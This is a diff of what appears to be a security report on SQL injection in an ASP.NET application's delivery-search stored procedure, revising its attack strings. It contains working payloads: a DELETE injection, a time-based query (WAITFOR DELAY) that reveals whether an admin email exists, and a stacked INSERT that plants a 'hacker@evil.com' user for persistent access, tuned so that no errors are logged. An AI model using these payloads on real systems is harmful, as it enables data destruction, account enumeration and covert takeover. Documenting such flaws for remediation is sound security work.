@@ -88,14 +88,13 @@ EXEC SearchDeliveriesByCargoDescription '...', ''; DELETE FROM Deliveries WHERE 
 **Attack String (Check if admin@example.com exists):**
 
 ```
-' OR (SELECT CASE WHEN EXISTS(SELECT 1 FROM AspNetUsers WHERE Email = 'admin@example.com') THEN (SELECT COUNT(*) FROM sys.objects a, sys.objects b, sys.objects c) ELSE 1 END) > 0; --
+test', 0, 20; IF EXISTS(SELECT 1 FROM AspNetUsers WHERE Email='admin@example.com') WAITFOR DELAY '00:00:03'; --
 ```
 
 **How it works:**
-
-- If the email exists, the query performs an expensive Cartesian product, causing a noticeable delay (several seconds)
 - If the email doesn't exist, the query completes quickly
 - By measuring response time, an attacker can enumerate valid email addresses
+- Note: the stored procedure actually runs, so no errors get logged.
 
 **Simpler timing attack:**
 
@@ -138,7 +137,7 @@ test', 0, 20; WAITFOR DELAY '00:00:05'; --
 **Attack String:**
 
 ```
-'; INSERT INTO AspNetUsers (Email, PasswordHash) VALUES ('hacker@evil.com', 'hash'); --
+cargo', 0, 20; INSERT INTO AspNetUsers (Email, UserName, NormalizedEmail, NormalizedUserName) VALUES ('hacker@evil.com', 'hacker', 'HACKER@EVIL.COM', 'HACKER'); --
 ```
 
 **Impact:** Injects a new user account for persistent access.
